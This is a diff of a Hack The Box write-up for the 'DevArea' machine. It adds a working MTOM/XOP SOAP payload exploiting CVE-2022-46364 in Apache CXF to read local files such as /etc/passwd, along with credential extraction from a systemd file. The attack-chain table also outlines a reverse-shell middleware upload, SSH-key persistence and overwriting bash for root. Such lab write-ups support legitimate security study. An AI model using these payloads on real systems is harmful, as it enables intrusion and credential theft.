@@ -10,19 +10,20 @@ Services: FTP, SSH, HTTP, HTTP-Proxy (Jetty), Hoverfly API
 
 ## Summary of Attack Chain
 
-| Step | User / Access   | Technique Used                              | Result                                                                                                                       |
-| :--: | :-------------- | :------------------------------------------ | :--------------------------------------------------------------------------------------------------------------------------- |
-|   1  | N/A (External)  | **Network Enumeration (Nmap)**              | Discovered open ports `21` (FTP), `22` (SSH), `8080` (SOAP), and `8888` (Hoverfly Admin API).                                |
-|   2  | Unauthenticated | **SSRF / Local File Read (CVE-2022-46364)** | Exploited XOP include vulnerability in Apache CXF on `8080/employeeservice`.                                                 |
-|   3  | Unauthenticated | **Credential Harvesting**                   | Retrieved `/etc/systemd/system/hoverfly.service` and extracted Hoverfly admin credentials.                                   |
-|   4  | Admin (API)     | **API Authentication**                      | Logged into the Hoverfly Admin API on port `8888` and obtained a JWT token.                                                  |
-|   5  | Admin (API)     | **Middleware Injection**                    | Uploaded a malicious Python reverse shell as middleware and switched the proxy to `synthesize` mode.                         |
-|   6  | Unauthenticated | **SSRF to Internal Proxy**                  | Triggered the vulnerable endpoint to interact with `127.0.0.1:8500`, executing the malicious middleware.                     |
-|   7  | dev_ryan        | **Initial Access / Reverse Shell**          | Received shell access as `dev_ryan` and retrieved **user.txt**.                                                              |
-|   8  | dev_ryan        | **SSH Persistence**                         | Added a public key to `authorized_keys` to maintain access.                                                                  |
-|   9  | dev_ryan        | **Privilege Enumeration (sudo)**            | Identified `NOPASSWD` privileges for `/opt/syswatch/syswatch.sh`.                                                            |
-|  10  | Root            | **System Binary Overwrite**                 | Used `dd` to overwrite `/usr/bin/bash` with a malicious script.                                                              |
-|  11  | Root            | **Privilege Escalation**                    | Executed `sudo /opt/syswatch/syswatch.sh -version`, triggering the compromised bash interpreter and retrieving **root.txt**. |
+| Step | User / Access   | Technique Used                              | Result                                                                                                                           |
+| :--: | :-------------- | :------------------------------------------ | :------------------------------------------------------------------------------------------------------------------------------- |
+|   1  | N/A (External)  | **Network Enumeration (Nmap)**              | Discovered open ports `21` (FTP), `22` (SSH), `8080` (SOAP), and `8888` (Hoverfly Admin API).                                    |
+|   2  | Unauthenticated | **SSRF / Local File Read (CVE-2022-46364)** | Exploited XOP include vulnerability in **Apache CXF** on `8080/employeeservice`.                                                 |
+|   3  | Unauthenticated | **Credential Harvesting**                   | Retrieved `/etc/systemd/system/hoverfly.service` and extracted admin credentials for **Hoverfly**.                               |
+|   4  | Admin (API)     | **API Authentication**                      | Logged into the Hoverfly Admin API on port `8888` and obtained a JWT session token.                                              |
+|   5  | Admin (API)     | **Middleware Injection**                    | Uploaded a malicious Python reverse shell as middleware and switched proxy mode to `synthesize`.                                 |
+|   6  | Unauthenticated | **SSRF to Internal Proxy**                  | Triggered the vulnerable endpoint to interact with `127.0.0.1:8500`, executing the malicious middleware.                         |
+|   7  | dev_ryan        | **Initial Access / Reverse Shell**          | Obtained shell access as `dev_ryan` and retrieved **user.txt**.                                                                  |
+|   8  | dev_ryan        | **SSH Persistence**                         | Added an SSH public key to `authorized_keys` to maintain persistent access.                                                      |
+|   9  | dev_ryan        | **Privilege Enumeration (sudo)**            | Identified `NOPASSWD` sudo execution rights for `/opt/syswatch/syswatch.sh`.                                                     |
+|  10  | Root            | **System Binary Overwrite**                 | Used `dd` to overwrite `/usr/bin/bash` with a malicious privilege escalation script.                                             |
+|  11  | Root            | **Privilege Escalation**                    | Executed `sudo /opt/syswatch/syswatch.sh -version`, triggering the compromised **Bash** interpreter and retrieving **root.txt**. |
+
 
 
 ![DevArea](htb_dev_area_MIndmap.png)
@@ -37,35 +38,113 @@ Every good chain starts with thorough enumeration. The initial Nmap scan highlig
 
 [Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevArea/nmap_results.nmap "Results")
 
-### **The Apache CXF SSRF (CVE-2022-46364)**
 
-The SOAP service on port 8080 uses Apache CXF, which is vulnerable to a Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI) flaw via XOP (XML-binary Optimized Packaging) inclusion. 
+### Anonymous FTP Access
+
+Connecting to the FTP service with anonymous credentials allowed us to access the `pub` directory and download a large Java Archive (`employee-service.jar`).
+
+```
+ftp> cd pub
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||48974|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
+226 Directory send OK.
+ftp> get employee-service.jar
+local: employee-service.jar remote: employee-service.jar
+229 Entering Extended Passive Mode (|||45114|)
+150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
+100% |***************************************************************************************************************************************************************************************************************|  6293 KiB    1.42 MiB/s    00:00 ETA
+226 Transfer complete.
+6445030 bytes received in 00:04 (1.35 MiB/s)
+```
+
+
+![DevArea](htb_dev_area_ftp.png)
+
+![DevArea](htb_dev_area_jar_server_strt.png)
+
+
+## Vulnerability Discovery
+
+### SOAP Service Analysis
+
+Visiting `http://devarea.htb:8080/employeeservice?wsdl` revealed a SOAP service with a `submitReport` function.
 
 ![DevArea](htb_dev_area_web.png)
 ![DevArea](htb_dev_area_jetty.png)
 ![DevArea](htb_dev_area_jetty_apa.png)
 
-**The Vulnerability:**
-By injecting an `<xop:Include>` tag into a standard SOAP request, We can force the underlying XML parser to fetch an external or local resource. The server reads the file and embeds its contents as a Base64 encoded string inside the XML response. 
+The WSDL showed the service structure:
 
-Using the `lfi.sh` wrapper script, we exploit this to read local files on the target.
+```xml
+<wsdl:operation name="submitReport">
+  <wsdl:input message="tns:submitReport"/>
+  <wsdl:output message="tns:submitReportResponse"/>
+</wsdl:operation>
+```
+
+### Apache CXF SSRF (CVE-2022-46364)
+
+Apache CXF 3.2.14 is vulnerable to **CVE-2022-46364** - a Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI) flaw via MTOM/XOP (XML-binary Optimized Packaging) Include.
+
+**The Vulnerability:**
+By injecting an `<xop:Include>` tag into a standard SOAP request, we can force the underlying XML parser to fetch an external or local resource. The server reads the file and embeds its contents as a Base64 encoded string inside the XML response.
+
+### Testing SSRF
+
+We crafted a SOAP request with MTOM/XOP to read local files:
+
+```xml
+--MIME_boundary
+Content-Type: text/xml; charset=UTF-8
+Content-Transfer-Encoding: binary
+Content-ID: <root.message@cxf.apache.org>
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <submitReport xmlns="http://devarea.htb/">
+      <arg0>
+        <employeeName>test</employeeName>
+        <department>test</department>
+        <content>
+          <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" 
+                       href="file:///etc/passwd"/>
+        </content>
+        <confidential>false</confidential>
+      </arg0>
+    </submitReport>
+  </soap:Body>
+</soap:Envelope>
+--MIME_boundary--
+```
+
+![DevArea](htb_dev_area_jar_lfi.png)
+
+## Exploitation & Credential Harvesting
+
+### Extracting Hoverfly Credentials
+
+Using the `lfi.sh` wrapper script, we exploited the SSRF to read local files on the target, specifically extracting the Hoverfly service configuration:
 
 ```bash
 ./lfi.sh file:///etc/systemd/system/hoverfly.service
 ```
+
 [lfi.sh](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevArea/lfi.sh "Results")
 
 
 ![DevArea](htb_dev_area_lfi_cred.png)
 
 
+
 **The Finding:**
 By reading the systemd service file for Hoverfly, we uncover how the service is started. The `ExecStart` line contains hardcoded administrative credentials passed as arguments:
+
 `ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IXXXXXXXXX -listen-on-host 0.0.0.0`
 
-
 ![DevArea](htb_dev_area_lfi_application.png)
-
 
 ### **Weaponizing Hoverfly for RCE**
 
@@ -136,7 +215,6 @@ dev_ryan@devarea:~$ cat user.txt
 
 As with any Linux box, the first step after landing a shell is checking for low-hanging fruit. 
 
-**The Command:**
 ```bash
 dev_ryan@devarea:~$ sudo -l
 ```
